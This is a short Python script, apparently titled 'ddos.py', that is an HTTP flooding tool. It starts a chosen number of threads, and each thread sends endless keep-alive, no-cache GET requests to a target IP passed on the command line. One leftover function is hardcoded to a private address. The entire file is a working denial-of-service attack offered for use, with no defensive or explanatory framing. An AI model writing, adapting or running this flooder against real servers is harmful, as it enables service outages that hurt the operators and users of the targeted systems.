import requests
from urllib.request import Request, urlopen
import sys
import time
import threading


def flood():
    headers = {'Cache-Control': 'no-cache', 'Connection': 'keep-alive',  'Keep-Alive': '1000'}
    while True:
        requests.get("http://172.16.1.51", headers=headers, stream=True, verify=False)


def flood2(target_ip):
    while True:
        # urllib.request.add_header
        # urlopen("http://172.16.1.51")
        # rq = Request("http://172.16.1.51")
        rq = Request("http://" + target_ip)
        rq.add_header('Connection', 'keep-alive')
        rq.add_header('Keep-Alive', 1000)
        rq.add_header('Cache-Control', 'no-cache')
        urlopen(rq)


if len(sys.argv) < 3:
    print("Usage: ddos.py <number of threads> <target ip>")
    sys.exit()
thread_list = []
for i in range(0, int(sys.argv[1])):
    # t = threading.Thread(target=flood, args=(), )
    t = threading.Thread(target=flood2, args=(sys.argv[2], ))
    t.daemon = True
    t.start()
    thread_list.append(t)

for i in range(0, len(thread_list)):
    thread_list[i].join()
